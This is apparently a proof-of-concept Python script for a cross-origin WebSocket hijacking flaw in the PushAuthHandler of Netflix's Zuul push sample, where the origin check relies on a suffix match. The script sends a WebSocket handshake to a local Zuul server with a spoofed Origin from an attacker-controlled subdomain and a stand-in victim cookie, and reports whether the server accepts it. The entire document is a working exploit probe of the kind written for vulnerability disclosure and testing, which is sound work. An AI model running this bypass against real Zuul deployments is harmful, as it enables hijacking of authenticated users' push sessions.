import requests

# PoC for Cross-Origin WebSocket Hijacking in PushAuthHandler
# The flawed check: origin.toLowerCase(Locale.ROOT).endsWith(originDomain)

zuul_push_url = "http://localhost:7008/push" # Assuming default sample push port
attacker_domain = "attacker.sample.netflix.com"
target_domain = ".sample.netflix.com"

print(f"[*] Testing CSRF bypass for domain: {target_domain}")

# 1. Simulate a request with a malicious Origin header that ends with the target domain
headers = {
    "Origin": f"http://{attacker_domain}",
    "Upgrade": "websocket",
    "Connection": "Upgrade",
    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
    "Sec-WebSocket-Version": "13",
    "Cookie": "userAuthCookie=victim_user_123"
}

try:
    # We use a standard GET request to simulate the initial WebSocket handshake
    response = requests.get(zuul_push_url, headers=headers, timeout=5)

    # In a real attack, the server would return 101 Switching Protocols if the origin is accepted
    # and the auth is successful.
    # Here, we check if the response status is not 400 Bad Request (which is what isInvalidOrigin returns)

    if response.status_code != 400:
        print(f"[+] SUCCESS: Origin '{attacker_domain}' was accepted by Zuul!")
        print(f"[+] Status Code: {response.status_code}")
    else:
        print(f"[-] FAILED: Origin '{attacker_domain}' was rejected with 400 Bad Request.")

except Exception as e:
    print(f"[-] Error connecting to Zuul: {e}")
    print("[!] Make sure the Zuul sample push server is running on localhost:7008")
